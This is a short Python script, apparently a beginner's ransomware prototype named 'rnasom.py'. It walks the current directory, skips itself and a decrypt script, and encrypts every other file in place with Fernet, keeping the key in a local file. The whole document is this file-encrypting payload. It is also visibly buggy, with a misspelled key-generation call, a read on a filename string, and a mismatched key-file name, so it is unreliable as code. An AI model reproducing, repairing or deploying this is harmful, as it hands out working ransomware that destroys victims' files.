import os
from cryptography.fernet import Fernet

files = []
isKeyAvailable = False
for file in os.listdir():
    if file == "rnasom.py" or file == "decrypt.py":
        continue
    elif file == 'thekey.key':
        keyFile = open('theKey.key', 'rb') 
        isKeyAvailable = True
        key = keyFile.read()
        keyFile.close()
    elif os.path.isfile(file):
        files.append(file)
        print(files)
        
if isKeyAvailable == False:
    key = Fernet.genrate_key()
    with open("thekey.key", 'wb') as thekey:
        thekey.write(key)
    
for file in files:
    with open(file, 'rb'):
        contentes = file.read()
    contentes_encrypted = Fernet(key).encrypt(contentes)
    with open(file, 'wb') as thefile:
        thefile.write(contentes_encrypted)
    